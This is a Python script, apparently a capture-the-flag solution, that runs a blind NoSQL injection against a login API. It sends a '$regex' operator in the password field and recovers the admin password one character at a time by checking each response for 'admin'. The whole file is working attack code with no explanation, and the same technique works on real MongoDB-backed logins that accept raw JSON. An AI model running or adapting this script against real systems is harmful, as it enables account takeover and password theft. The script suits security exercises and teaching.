
# Run with:
# cls && python3 nosql2.py

# Import libs
import requests
import string

### Constants
url = "http://cits4projtg2.cybernemosyne.xyz:1007/api/login"
headers = {"contentType": "application/json"}
letters = string.ascii_lowercase + string.ascii_uppercase


# Helper function
# Get the next char in the password
# Arg1 = Start, the current start of the password
def getNextChar(start):

    # Holder for char found
    charFound = '?'

    # For every lower/upper case char
    for curC in letters:

        # Create payload
        curPW = "{}{}".format(start, curC)
        payload = {
            "username": {"$eq": "admin"}, 
            "password": {"$regex": curPW}
        }

        # TEST
        # print("  Trying '{}'".format(curPW))

        # Send request
        response = requests.post(url, json=payload, headers=headers)

        # If char produced a login
        if(str(response.content).__contains__("admin")):

            # Save this char
            charFound = curC

            # Don't process further
            break
    
    # Return char found
    return charFound



# Program heading
print("\n###################### NOSQL2 ######################\n")

### Password holder
password = "CTF"
print("Initial password: " + password)

# Drive BFA
while(True):

    # Get the next
    nextChar = getNextChar(password)

    # If next char was an actual char
    if(nextChar != '?'):

        # Add the char to the password and go again
        password += nextChar

        # Print partial password
        print("Partial password: " + password)
    else:

        # Else if no char was found, 
        # the password has been found:
        # Notify and exit
        print("\nThe full password is: \n{}\n".format(password))
        exit()


